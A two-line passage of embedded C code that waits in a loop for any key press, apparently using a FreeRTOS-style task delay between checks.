    while (!check(AnyKeyPress)) vTaskDelay(50);
}
